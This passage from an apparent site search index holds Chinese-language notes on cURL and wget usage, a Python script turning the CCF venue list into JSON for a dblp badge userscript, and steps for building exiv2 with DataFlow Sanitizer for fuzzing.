\u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09 \u5b98\u65b9\uff1ahttps://curl.haxx.se/ \u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html \u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/ \u4e0b\u8f7d7.51 x64\u7684Win\u7248\u672c \u4e0b\u8f7d7.16 32bit\u7684curl32.exe \u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42 \u00b6 \u7528Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\uff0c\u5bf9\u8bf7\u6c42\u53f3\u952e\uff0cCopy as cURL\u5c31\u597d\u5566 \u5176\u4e2d\u5982\u679c\u9009\u62e9\u4e86cmd\u7684\u7248\u672c\uff0c\u662f\u4e0d\u80fd\u7528\u4e8e\u5199bat\u7684\uff0c\u6211\u7684\u505a\u6cd5\u662f\u590d\u5236\u6210bash\u7684\u7248\u672c\u7528python\u5faa\u73af\u4e4b \u57fa\u672c\u6559\u7a0b \u00b6 REM \u5728bat\u4e2dREM\u547d\u4ee4\u8868\u793a\u6ce8\u91ca\u884c REM \u7b80\u5355\u7684get\u4e00\u4e0b curl http://ip.cn REM \u4fdd\u5b58\u5230\u6587\u4ef6\u5e76\u65ad\u70b9\u7eed\u4f20\uff08\u53ef\u4ee5\u4e0d\u6307\u5b9a\u6587\u4ef6\u540d-O\uff09 curl -o iplist.txt -c http://f.ip.cn/rt/chnroutes.txt REM POST\u8bf7\u6c42\uff0c\u8bbe\u7f6eReferer\uff0c\u5e76\u4f7f\u7528\u4ee3\u7406 curl http://httpbin.org/post --data \"something=somedata\" -H \"Referer: http://github.com/zjuchenyuan/\" --proxy socks5://127.0.0.1:1080 REM \u6587\u4ef6\u4e0a\u4f20 @\u6587\u4ef6\u540d REM POST\u6a21\u5f0f\u4e0b\u7684\u6587\u4ef6\u4e0a\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u6bd4\u5982 REM <form method= \"POST\" enctype= \"multipart/form-data\" action= \"http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi\" > REM <input type= file name= upload > REM <input type= submit name= nick value= \"go\" > REM </form> REM \u8fd9\u6837\u4e00\u4e2aHTTP\u8868\u5355\uff0c\u6211\u4eec\u8981\u7528curl\u8fdb\u884c\u6a21\u62df\uff0c\u5c31\u8be5\u662f\u8fd9\u6837\u7684\u8bed\u6cd5\uff1a curl -F upload=@localfile -F nick=go http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi REM \u767b\u5f55\u8def\u7531\u5668 curl http://192.168.1.1 -u admin:admin REM \u5b58\u4e0bSet-Cookie curl -D cookie0001.txt http://www.yahoo.com REM \u4f7f\u7528\u5b58\u50a8\u7684Cookie curl -b cookie0001.txt http://www.yahoo.com REM dict\u534f\u8bae\u67e5\u5b57\u5178\uff0c\u663e\u793a\u8be6\u7ec6\u7684\u8bf7\u6c42\u4fe1\u606f curl dict://www.dict.org/d:computer -v \u8fd8\u53ef\u4ee5\u5faa\u73af\u54df \u00b6 curl -OJ http://example.com/[1-100].jpg curl -o \u201c#1.html\u201d http://www.example.com/page/[1-20] wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde \u00b6 From: https://askubuntu.com/questions/72663/how-to-make-wget-retry-download-if-speed-goes-below-certain-threshold \u7528\u6cd5\uff1a wget - c --tries=0 --read-timeout=20 [URL] \u5176\u4e2d-c\u8868\u793a\u65ad\u70b9\u7eed\u4f20\uff0c\u2013tries=0\u8868\u793a\u65e0\u9650\u6b21\u91cd\u8bd5\uff0c\u2013read-timeout\u6307\u5b9a20s\u65e0\u7f51\u7edc\u6d3b\u52a8\u5c31\u8ba4\u4e3a\u51fa\u9519(\u9ed8\u8ba4\u662f15\u5206\u949f) wget\u9650\u5236\u5355\u6587\u4ef6\u6700\u5927\u5927\u5c0f \u00b6 \u6765\u6e90\uff1a https://yurichev.com/wget.html \u53ef\u4ee5\u4e0b\u8f7d\u5230 \u4e8c\u8fdb\u5236 \u76f4\u63a5\u7528 \u589e\u52a0\u4e86 --limit-size \u53c2\u6570\uff0c\u6bd4\u5982\u6279\u91cf\u4e0b\u8f7d\u4e00\u4e2aftp\u94fe\u63a5\uff1a wget --limit-size=10g --restrict-file-names=nocontrol -nH --tries=0 --read-timeout=20 -m ftp://xxx","title":"cURL"},{"location":"cURL/#curl","text":"curl\u8fd9\u4e48\u6709\u7528\u7684\u4e1c\u897f\uff0c\u8fd8\u662f\u5355\u72ec\u5f00\u4e2a\u6587\u6863\u54af~ \u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09 \u5b98\u65b9\uff1ahttps://curl.haxx.se/ \u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html \u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/ \u4e0b\u8f7d7.51 x64\u7684Win\u7248\u672c \u4e0b\u8f7d7.16 32bit\u7684curl32.exe","title":"cURL"},{"location":"cURL/#_1","text":"\u7528Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\uff0c\u5bf9\u8bf7\u6c42\u53f3\u952e\uff0cCopy as cURL\u5c31\u597d\u5566 \u5176\u4e2d\u5982\u679c\u9009\u62e9\u4e86cmd\u7684\u7248\u672c\uff0c\u662f\u4e0d\u80fd\u7528\u4e8e\u5199bat\u7684\uff0c\u6211\u7684\u505a\u6cd5\u662f\u590d\u5236\u6210bash\u7684\u7248\u672c\u7528python\u5faa\u73af\u4e4b","title":"\u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42"},{"location":"cURL/#_2","text":"REM \u5728bat\u4e2dREM\u547d\u4ee4\u8868\u793a\u6ce8\u91ca\u884c REM \u7b80\u5355\u7684get\u4e00\u4e0b curl http://ip.cn REM \u4fdd\u5b58\u5230\u6587\u4ef6\u5e76\u65ad\u70b9\u7eed\u4f20\uff08\u53ef\u4ee5\u4e0d\u6307\u5b9a\u6587\u4ef6\u540d-O\uff09 curl -o iplist.txt -c http://f.ip.cn/rt/chnroutes.txt REM POST\u8bf7\u6c42\uff0c\u8bbe\u7f6eReferer\uff0c\u5e76\u4f7f\u7528\u4ee3\u7406 curl http://httpbin.org/post --data \"something=somedata\" -H \"Referer: http://github.com/zjuchenyuan/\" --proxy socks5://127.0.0.1:1080 REM \u6587\u4ef6\u4e0a\u4f20 @\u6587\u4ef6\u540d REM POST\u6a21\u5f0f\u4e0b\u7684\u6587\u4ef6\u4e0a\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u6bd4\u5982 REM <form method= \"POST\" enctype= \"multipart/form-data\" action= \"http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi\" > REM <input type= file name= upload > REM <input type= submit name= nick value= \"go\" > REM </form> REM \u8fd9\u6837\u4e00\u4e2aHTTP\u8868\u5355\uff0c\u6211\u4eec\u8981\u7528curl\u8fdb\u884c\u6a21\u62df\uff0c\u5c31\u8be5\u662f\u8fd9\u6837\u7684\u8bed\u6cd5\uff1a curl -F upload=@localfile -F nick=go http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi REM \u767b\u5f55\u8def\u7531\u5668 curl http://192.168.1.1 -u admin:admin REM \u5b58\u4e0bSet-Cookie curl -D cookie0001.txt http://www.yahoo.com REM \u4f7f\u7528\u5b58\u50a8\u7684Cookie curl -b cookie0001.txt http://www.yahoo.com REM dict\u534f\u8bae\u67e5\u5b57\u5178\uff0c\u663e\u793a\u8be6\u7ec6\u7684\u8bf7\u6c42\u4fe1\u606f curl dict://www.dict.org/d:computer -v","title":"\u57fa\u672c\u6559\u7a0b"},{"location":"cURL/#_3","text":"curl -OJ http://example.com/[1-100].jpg curl -o \u201c#1.html\u201d http://www.example.com/page/[1-20]","title":"\u8fd8\u53ef\u4ee5\u5faa\u73af\u54df"},{"location":"cURL/#wget0bs","text":"From: https://askubuntu.com/questions/72663/how-to-make-wget-retry-download-if-speed-goes-below-certain-threshold \u7528\u6cd5\uff1a wget - c --tries=0 --read-timeout=20 [URL] \u5176\u4e2d-c\u8868\u793a\u65ad\u70b9\u7eed\u4f20\uff0c\u2013tries=0\u8868\u793a\u65e0\u9650\u6b21\u91cd\u8bd5\uff0c\u2013read-timeout\u6307\u5b9a20s\u65e0\u7f51\u7edc\u6d3b\u52a8\u5c31\u8ba4\u4e3a\u51fa\u9519(\u9ed8\u8ba4\u662f15\u5206\u949f)","title":"wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde"},{"location":"cURL/#wget","text":"\u6765\u6e90\uff1a https://yurichev.com/wget.html \u53ef\u4ee5\u4e0b\u8f7d\u5230 \u4e8c\u8fdb\u5236 \u76f4\u63a5\u7528 \u589e\u52a0\u4e86 --limit-size \u53c2\u6570\uff0c\u6bd4\u5982\u6279\u91cf\u4e0b\u8f7d\u4e00\u4e2aftp\u94fe\u63a5\uff1a wget --limit-size=10g --restrict-file-names=nocontrol -nH --tries=0 --read-timeout=20 -m ftp://xxx","title":"wget\u9650\u5236\u5355\u6587\u4ef6\u6700\u5927\u5927\u5c0f"},{"location":"ccfbadge/","text":"CCF Badge \u00b6 \u5728dblp\u641c\u7d22\u7ed3\u679c\u4e2d\u9ad8\u4eae\u663e\u793a\u5b89\u5168\u9876\u4f1a\u548cCCF\u5206\u7c7b+\u65b9\u5411 \u5b89\u88c5 Chrome\u63d2\u4ef6 Tampermonkey \u540e\u70b9\u51fb\u5b89\u88c5\uff1a https://blog.chenyuan.me/code/ccfbadge.user.js \u6548\u679c\uff1a https://dblp.org/search?q=use-after-free \u6570\u636e\u5904\u7406\u8fc7\u7a0b \u00b6 \u4e0b\u8f7d\u5b98\u65b9\u76ee\u5f55PDF: https://www.ccf.org.cn/Academic_Evaluation/By_category/ \u8f6c\u6362\u6210Excel: https://smallpdf.com/pdf-to-excel Python\u8bfb\u53d6excel\u5904\u7406\uff1a\u90e8\u5206dblp\u6709\u94fe\u63a5\u4f46pdf\u4e2d\u4e0d\u662fdblp\u94fe\u63a5\u7684\u9700\u8981\u624b\u5de5\u66f4\u6b63\uff0casiaccs\u7684\u94fe\u63a5\u9700\u8981\u4e0eccs\u533a\u5206 import xlrd , json from pprint import pprint wb = xlrd . open_workbook ( \"\u4e2d\u56fd\u8ba1\u7b97\u673a\u5b66\u4f1a\u63a8\u8350\u56fd\u9645\u5b66\u672f\u4f1a\u8bae\u548c\u671f\u520a\u76ee\u5f55-2019-converted.xlsx\" ) type = \"\" allccf = {} for sid in range ( wb . nsheets ) : s = wb . sheet_by_index ( sid ) data = [ tuple ([ s . cell_value ( i , j ) for j in range ( s . ncols )]) for i in range ( s . nrows )] for i , line in enumerate ( data ) : if line [ 0 ] == \"\u5e8f\u53f7\" : abc = data [ i - 1 ][ 0 ]. split ( \"\u3001\" )[ 1 ]. replace ( \"\u7c7b\" , \"\" ). strip () if i - 2 >= 0 : type = data [ i - 2 ][ 0 ]. split ( \"\\n\" )[ - 1 ]. strip (). strip ( \"\uff08(\uff09)\" ). replace ( \"\uff0f\" , \"/\" ). split ( \"/\" )[ 0 ]. replace ( \"\u8ba1\u7b97\u673a\" , \"\" ) table = data [ i + 1 : ] newtable = [] for i in table : if not any ([ str ( j ). strip () for j in i ]) : continue id , simple , full , publisher , url = [ str ( j ). replace ( \"\\n\" , \" \" ). replace ( \" \" , \" \" ) for j in i [:- 1 ]] # remove last empty column # print ( i ) url = { \"Performance Evaluation: An International Journal\" : \"https://dblp.uni-trier.de/db/journals/pe\" , 'Journal of Electronic Testing-Theory and Applications': \"https://dblp.uni-trier.de/db/journals/et\" , \"Hot Chips: A Symposium on High Performance Chips\" : \"https://dblp.uni-trier.de/db/conf/hotchips/index.html\" , \"ACM Transactions on Privacy and Security\" : \"https://dblp.org/db/journals/tissec/\" , \"Computer Law and Security Review\" : \"https://dblp.org/db/journals/clsr/\" , \"IFIP WG 11.9 International Conference on Digital Forensics\" : \"https://dblp.org/db/conf/ifip11-9/\" , \"Computer Animation and Virtual Worlds\" : \"https://dblp.org/db/journals/jvca/index.html\" , \"IET Computer Vision\" : \"https://dblp.org/db/journals/iet-cvi/index.html\" , \"IET Signal Processing\" : \"https://dblp.org/db/journals/iet-spr/index.html\" , \"International Conference on Collaborative Computing: Networking, Applications and Worksharing\" : \"https://dblp.org/db/conf/colcom/index.html\" , \"Asia Conference on Computer and Communications Security\" : \"https://dblp.org/db/conf/asiaccs/index.html\" , }. get ( full , url ) if \"dblp\" not in url : # print ([ id , simple , full , publisher , url ]) pass else : url = \"/\" . join ( url . split ( \"/\" )[ 4 : 6 ]) # print ( url ) newtable . append ([ id , simple , full , publisher , url ]) if url in allccf : # print ( i , allccf [ url ]) # we find that aisaccs link is wrong assert allccf [ url ][ 1 ] == abc # same item in different categories , should be same in ABC allccf [ url ] = ( allccf [ url ][ 0 ] + \"/\" + type , abc ) else : allccf [ url ] = ( type , abc ) # print ( type , abc , [ i [ 4 ] for i in newtable ]) open ( \"ccf.json\" , \"w\" ). write ( json . dumps ( allccf ))","title":"CCF Badge"},{"location":"ccfbadge/#ccf-badge","text":"\u5728dblp\u641c\u7d22\u7ed3\u679c\u4e2d\u9ad8\u4eae\u663e\u793a\u5b89\u5168\u9876\u4f1a\u548cCCF\u5206\u7c7b+\u65b9\u5411 \u5b89\u88c5 Chrome\u63d2\u4ef6 Tampermonkey \u540e\u70b9\u51fb\u5b89\u88c5\uff1a https://blog.chenyuan.me/code/ccfbadge.user.js \u6548\u679c\uff1a https://dblp.org/search?q=use-after-free","title":"CCF Badge"},{"location":"ccfbadge/#_1","text":"\u4e0b\u8f7d\u5b98\u65b9\u76ee\u5f55PDF: https://www.ccf.org.cn/Academic_Evaluation/By_category/ \u8f6c\u6362\u6210Excel: https://smallpdf.com/pdf-to-excel Python\u8bfb\u53d6excel\u5904\u7406\uff1a\u90e8\u5206dblp\u6709\u94fe\u63a5\u4f46pdf\u4e2d\u4e0d\u662fdblp\u94fe\u63a5\u7684\u9700\u8981\u624b\u5de5\u66f4\u6b63\uff0casiaccs\u7684\u94fe\u63a5\u9700\u8981\u4e0eccs\u533a\u5206 import xlrd , json from pprint import pprint wb = xlrd . open_workbook ( \"\u4e2d\u56fd\u8ba1\u7b97\u673a\u5b66\u4f1a\u63a8\u8350\u56fd\u9645\u5b66\u672f\u4f1a\u8bae\u548c\u671f\u520a\u76ee\u5f55-2019-converted.xlsx\" ) type = \"\" allccf = {} for sid in range ( wb . nsheets ) : s = wb . sheet_by_index ( sid ) data = [ tuple ([ s . cell_value ( i , j ) for j in range ( s . ncols )]) for i in range ( s . nrows )] for i , line in enumerate ( data ) : if line [ 0 ] == \"\u5e8f\u53f7\" : abc = data [ i - 1 ][ 0 ]. split ( \"\u3001\" )[ 1 ]. replace ( \"\u7c7b\" , \"\" ). strip () if i - 2 >= 0 : type = data [ i - 2 ][ 0 ]. split ( \"\\n\" )[ - 1 ]. strip (). strip ( \"\uff08(\uff09)\" ). replace ( \"\uff0f\" , \"/\" ). split ( \"/\" )[ 0 ]. replace ( \"\u8ba1\u7b97\u673a\" , \"\" ) table = data [ i + 1 : ] newtable = [] for i in table : if not any ([ str ( j ). strip () for j in i ]) : continue id , simple , full , publisher , url = [ str ( j ). replace ( \"\\n\" , \" \" ). replace ( \" \" , \" \" ) for j in i [:- 1 ]] # remove last empty column # print ( i ) url = { \"Performance Evaluation: An International Journal\" : \"https://dblp.uni-trier.de/db/journals/pe\" , 'Journal of Electronic Testing-Theory and Applications': \"https://dblp.uni-trier.de/db/journals/et\" , \"Hot Chips: A Symposium on High Performance Chips\" : \"https://dblp.uni-trier.de/db/conf/hotchips/index.html\" , \"ACM Transactions on Privacy and Security\" : \"https://dblp.org/db/journals/tissec/\" , \"Computer Law and Security Review\" : \"https://dblp.org/db/journals/clsr/\" , \"IFIP WG 11.9 International Conference on Digital Forensics\" : \"https://dblp.org/db/conf/ifip11-9/\" , \"Computer Animation and Virtual Worlds\" : \"https://dblp.org/db/journals/jvca/index.html\" , \"IET Computer Vision\" : \"https://dblp.org/db/journals/iet-cvi/index.html\" , \"IET Signal Processing\" : \"https://dblp.org/db/journals/iet-spr/index.html\" , \"International Conference on Collaborative Computing: Networking, Applications and Worksharing\" : \"https://dblp.org/db/conf/colcom/index.html\" , \"Asia Conference on Computer and Communications Security\" : \"https://dblp.org/db/conf/asiaccs/index.html\" , }. get ( full , url ) if \"dblp\" not in url : # print ([ id , simple , full , publisher , url ]) pass else : url = \"/\" . join ( url . split ( \"/\" )[ 4 : 6 ]) # print ( url ) newtable . append ([ id , simple , full , publisher , url ]) if url in allccf : # print ( i , allccf [ url ]) # we find that aisaccs link is wrong assert allccf [ url ][ 1 ] == abc # same item in different categories , should be same in ABC allccf [ url ] = ( allccf [ url ][ 0 ] + \"/\" + type , abc ) else : allccf [ url ] = ( type , abc ) # print ( type , abc , [ i [ 4 ] for i in newtable ]) open ( \"ccf.json\" , \"w\" ). write ( json . dumps ( allccf ))","title":"\u6570\u636e\u5904\u7406\u8fc7\u7a0b"},{"location":"dfsan/","text":"DataFlow Sanitizer \u00b6 http://releases.llvm.org/8.0.0/tools/clang/docs/DataFlowSanitizer.html Compiling Exiv2 with DFSan \u00b6 dfsan require all functions (including C++ libraries) to be instructed, given source code or specified ABI list. This is a tiring work, thankfully Angora has paved our way, which utilize dfsan to locate which bytes are related to conditional branch. So, let\u2019s start building in Angora container. In the following steps, we will compile libcxx using dfsan first, then compile expat and zlib, finally we can build exiv2 with dfsan. # run the container, this image is based on Ubuntu 16.04.6 LTS, and contain clang-7 and required abi list file. alias d = docker d pull zjuchenyuan / angora d run - it -- privileged - v / data : / data - w / data zjuchenyuan / angora / bin / bash # create our ABI list file cd / data cat / angora / llvm_mode / build / dfsan_rt / share / dfsan_abilist . txt > mylist . txt cat / angora / llvm_mode / dfsan_rt / abilibstdc ++. txt >> mylist . txt # download and compile libc++, ref: https://github.com/AngoraFuzzer/Angora/blob/master/llvm_mode/libcxx/compile.sh apt install - y ninja - build LLVM_VERSION = 7.0 . 0 CUR_DIR =/ data CLANG_SRC =$ { CUR_DIR } / llvm_src wget http : // releases . llvm . org /$ { LLVM_VERSION } / llvm -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / cfe -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / compiler - rt -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libcxx -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libcxxabi -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libunwind -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / clang - tools - extra -$ { LLVM_VERSION } . src . tar . xz tar - Jxf $ { CUR_DIR } / llvm -$ { LLVM_VERSION } . src . tar . xz mv llvm -$ { LLVM_VERSION } . src $ CLANG_SRC cd $ { CLANG_SRC } / tools tar - Jxf $ { CUR_DIR } / cfe -$ { LLVM_VERSION } . src . tar . xz mv cfe -$ { LLVM_VERSION } . src clang cd $ { CLANG_SRC } / tools / clang / tools tar - Jxf $ { CUR_DIR } / clang - tools - extra -$ { LLVM_VERSION } . src . tar . xz mv clang - tools - extra -$ { LLVM_VERSION } . src extra cd $ { CLANG_SRC } / projects tar - Jxvf $ { CUR_DIR } / compiler - rt -$ { LLVM_VERSION } . src . tar . xz mv compiler - rt -$ { LLVM_VERSION } . src compiler - rt tar - Jxvf $ { CUR_DIR } / libcxx -$ { LLVM_VERSION } . src . tar . xz mv libcxx -$ { LLVM_VERSION } . src libcxx tar - Jxvf $ { CUR_DIR } / libcxxabi -$ { LLVM_VERSION } . src . tar . xz mv libcxxabi -$ { LLVM_VERSION } . src libcxxabi tar - Jxvf $ { CUR_DIR } / libunwind -$ { LLVM_VERSION } . src . tar . xz mv libunwind -$ { LLVM_VERSION } . src libunwind cp ./ libcxxabi / include /* ./ libcxx / include mkdir - p / data / build_llvm && cd / data / build_llvm export CC = \"clang -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\" CXX = \"clang++ -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\" cmake - G Ninja ../ llvm_src / - DLIBCXXABI_ENABLE_SHARED = NO - DLIBCXX_ENABLE_SHARED = NO - DLIBCXX_CXX_ABI = libcxxabi ninja cxx cxxabi export CC = \"clang -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\" CXX = \"clang++ -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\" # download dependency (expat and zlib) source code cd / data sed - i 's/# deb-src/deb-src/g' / etc / apt / sources . list apt update apt source zlib1g - dev libexpat1 - dev # compile expat cd / data / expat - 2.1 . 0 ./ configure -- prefix =/ data / expat make install - j # compile zlib cd / data / zlib - 1.2 . 8. dfsg / ./ configure -- prefix =/ data / zlib make install - j # download source code cd / data wget http : // exiv2 . org / releases / exiv2 - 0.26 - trunk . tar . gz tar zxvf exiv2 - 0.26 - trunk . tar . gz cd / data / exiv2 - trunk ./ configure -- disable - shared -- with - expat =/ data / expat -- with - zlib =/ data / zlib # now, we get our binary file: ./bin/exiv2, about 38MB Q&A \u00b6 Why docker image zjuchenyuan/angora \u00b6 Just to use already built-in clang-7, and two abi list files Why -ldl -lrt -lpthread \u00b6 It\u2019s required for cmake cxx, otherwise build error like Host compiler appears to require libatomic, but cannot find it Why compile expat and zlib \u00b6 exiv2 depends on these two libraries, and DFSan require their source code to be compiled with DFSan. Or, you can follow instructions here: https://github.com/AngoraFuzzer/Angora/issues/38, to create an abi list for libraries. / angora / tools / gen_library_abilist . sh / usr / lib / x86_64 - linux - gnu / libz . so discard >> / data / mylist . txt / angora / tools / gen_library_abilist . sh / usr / lib / x86_64 - linux - gnu / libexpat . so discard >> / data / mylist . txt Why --disable-shared \u00b6 This is to build a single binary file for easier fuzzing. Wanna debug? No optimization \u00b6 Compiling Exiv2 with DFSan, with -O0 # let's continue our building process, use -O0 to facilitate debugging cd /data/exiv2-trunk CFLAGS='-O0' CXXFLAGS='-O0' ./configure --disable-shared --with-expat=/data/expat --with-zlib=/data/zlib make clean; find . -name '*.o' -delete make -j # now we get bin/exiv2, about 44MB","title":"DFSan"},{"location":"dfsan/#dataflow-sanitizer","text":"http://releases.llvm.org/8.0.0/tools/clang/docs/DataFlowSanitizer.html","title":"DataFlow Sanitizer"},{"location":"dfsan/#compiling-exiv2-with-dfsan","text":"dfsan require all functions (including C++ libraries) to be instructed, given source code or specified ABI list. This is a tiring work, thankfully Angora has paved our way, which utilize dfsan to locate which bytes are related to conditional branch. So, let\u2019s start building in Angora container. In the following steps, we will compile libcxx using dfsan first, then compile expat and zlib, finally we can build exiv2 with dfsan. # run the container, this image is based on Ubuntu 16.04.6 LTS, and contain clang-7 and required abi list file. alias d = docker d pull zjuchenyuan / angora d run - it -- privileged - v / data : / data - w / data zjuchenyuan / angora / bin / bash # create our ABI list file cd / data cat / angora / llvm_mode / build / dfsan_rt / share / dfsan_abilist . txt > mylist . txt cat / angora / llvm_mode / dfsan_rt / abilibstdc ++. txt >> mylist . txt # download and compile libc++, ref: https://github.com/AngoraFuzzer/Angora/blob/master/llvm_mode/libcxx/compile.sh apt install - y ninja - build LLVM_VERSION = 7.0 . 0 CUR_DIR =/ data CLANG_SRC =$ { CUR_DIR } / llvm_src wget http : // releases . llvm . org /$ { LLVM_VERSION } / llvm -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / cfe -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / compiler - rt -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libcxx -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libcxxabi -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / libunwind -$ { LLVM_VERSION } . src . tar . xz wget http : // releases . llvm . org /$ { LLVM_VERSION } / clang - tools - extra -$ { LLVM_VERSION } . src . tar . xz tar - Jxf $ { CUR_DIR } / llvm -$ { LLVM_VERSION } . src . tar . xz mv llvm -$ { LLVM_VERSION } . src $ CLANG_SRC cd $ { CLANG_SRC } / tools tar - Jxf $ { CUR_DIR } / cfe -$ { LLVM_VERSION } . src . tar . xz mv cfe -$ { LLVM_VERSION } . src clang cd $ { CLANG_SRC } / tools / clang / tools tar - Jxf $ { CUR_DIR } / clang - tools - extra -$ { LLVM_VERSION } . src . tar . xz mv clang - tools - extra -$ { LLVM_VERSION } . src extra cd $ { CLANG_SRC } / projects tar - Jxvf $ { CUR_DIR } / compiler - rt -$ { LLVM_VERSION } . src . tar . xz mv compiler - rt -$ { LLVM_VERSION } . src compiler - rt tar - Jxvf $ { CUR_DIR } / libcxx -$ { LLVM_VERSION } . src . tar . xz mv libcxx -$ { LLVM_VERSION } . src libcxx tar - Jxvf $ { CUR_DIR } / libcxxabi -$ { LLVM_VERSION } . src . tar . xz mv libcxxabi -$ { LLVM_VERSION } . src libcxxabi tar - Jxvf $ { CUR_DIR } / libunwind -$ { LLVM_VERSION } . src . tar . xz mv libunwind -$ { LLVM_VERSION } . src libunwind cp ./ libcxxabi / include /* ./ libcxx / include mkdir - p / data / build_llvm && cd / data / build_llvm export CC = \"clang -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\" CXX = \"clang++ -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\" cmake - G Ninja ../ llvm_src / - DLIBCXXABI_ENABLE_SHARED = NO - DLIBCXX_ENABLE_SHARED = NO - DLIBCXX_CXX_ABI = libcxxabi ninja cxx cxxabi export CC = \"clang -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\" CXX = \"clang++ -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\" # download dependency (expat and zlib) source code cd / data sed - i 's/# deb-src/deb-src/g' / etc / apt / sources . list apt update apt source zlib1g - dev libexpat1 - dev # compile expat cd / data / expat - 2.1 . 0 ./ configure -- prefix =/ data / expat make install - j # compile zlib cd / data / zlib - 1.2 . 8. dfsg / ./ configure -- prefix =/ data / zlib make install - j # download source code cd / data wget http : // exiv2 . org / releases / exiv2 - 0.26 - trunk . tar . gz tar zxvf exiv2 - 0.26 - trunk . tar . gz cd / data / exiv2 - trunk ./ configure -- disable - shared -- with - expat =/ data / expat -- with - zlib =/ data / zlib # now, we get our binary file: ./bin/exiv2, about 38MB","title":"Compiling Exiv2 with DFSan"},{"location":"dfsan/#qa","text":"","title":"Q&amp;A"},{"location":"dfsan/#why-docker-image-zjuchenyuanangora","text":"Just to use already built-in clang-7, and two abi list files","title":"Why docker image zjuchenyuan/angora"},{"location":"dfsan/#why-ldl-lrt-lpthread","text":"It\u2019s required for cmake cxx, otherwise build error like Host compiler appears to require libatomic, but cannot find it","title":"Why -ldl -lrt -lpthread"},{"location":"dfsan/#why-compile-expat-and-zlib","text":"exiv2 depends on these two libraries, and DFSan require their source code to be compiled with DFSan. Or, you can follow instructions here: https://github.com/AngoraFuzzer/Angora/issues/38, to create an abi list for libraries. / angora / tools / gen_library_abilist . sh / usr / lib / x86_64 - linux - gnu / libz . so discard >> / data / mylist . txt / angora / tools / gen_library_abilist . sh / usr / lib / x86_64 - linux - gnu / libexpat . so discard >> / data / mylist . txt","title":"Why compile expat and zlib"},{"location":"dfsan/#why-disable-shared","text":"This is to build a single binary file for easier fuzzing.","title":"Why --disable-shared"},{"location":"dfsan/#wanna-debug-no-optimization","text":"Compiling Exiv2 with DFSan, with -O0 # let's continue our building process, use -O0 to facilitate debugging cd /data/exiv2-trunk CFLAGS='-O0' CXXFLAGS='-O0' ./configure --disable-shared --with-expat=/data/expat --with-zlib=/data/zlib make clean; find . -name '*.o' -delete make -j # now we get bin/exiv2, about 44MB","title":"Wanna debug? No optimization"},{"location":"gist/","text":"gist \u8bb0\u5f55\u4e00\u4e9b\u4ee3\u7801\u7247\u6bb5 \u00b6 print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4 \u00b6 